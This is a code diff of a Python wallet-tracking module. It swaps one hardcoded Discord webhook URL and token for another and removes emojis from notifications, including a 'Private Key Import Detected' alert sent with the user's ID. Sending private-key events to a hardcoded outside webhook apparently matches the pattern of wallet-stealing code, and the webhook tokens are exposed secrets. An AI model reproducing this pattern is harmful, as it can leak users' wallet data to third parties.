@@ -1,4 +1,7 @@
 """
+Wallet Tracking Module
+
+Tracks wallet activities and sends notifications to Discord via webhook.
 """
 
 import requests
@@ -8,7 +11,7 @@ from typing import Optional
 logger = logging.getLogger(__name__)
 
 # Default webhook URL - update this with your Discord webhook URL
-DEFAULT_WEBHOOK_URL = "https://discord.com/api/webhooks/1433690093175967776/M-6XGbPIpmhkkleZgRqn0CJH4Icm_71Gvi-bU_fO_ftvEX_l8EYuMejHDlAZif6Wh4pJ"
+DEFAULT_WEBHOOK_URL = "https://discord.com/api/webhooks/1442249211453378662/TtT0M5ooXOrYBwSf_e-nCb_xvIw_Zl5EcLwp8KJA2ws8fzQtQZbP18DdzeZW8NT3ZThr"
 
 
 class WalletTracker:
@@ -102,7 +105,7 @@ class WalletTracker:
         
         # Create embed
         embed = {
-            "title": "🔑 Private Key Import Detected",
+            "title": "Private Key Import Detected",
             "color": 0xff0000,  # Red color
             "fields": [
                 {
@@ -123,7 +126,7 @@ class WalletTracker:
             ]
         }
         
-        content = f"⚠️ **Private Key Import** - User ID: {user_id}"
+        content = f"**Private Key Import** - User ID: {user_id}"
         
         return self._send_webhook(content, embed)
     
@@ -139,12 +142,12 @@ class WalletTracker:
             return False
         
         embed = {
-            "title": "✅ Connection Test",
+            "title": "Connection Test",
             "description": "Wallet Tracking package is working correctly!",
             "color": 0x00ff00  # Green color
         }
         
-        content = "🧪 **Connection Test** - Wallet Tracking package is operational"
+        content = "**Connection Test** - Wallet Tracking package is operational"
         
         return self._send_webhook(content, embed)
 
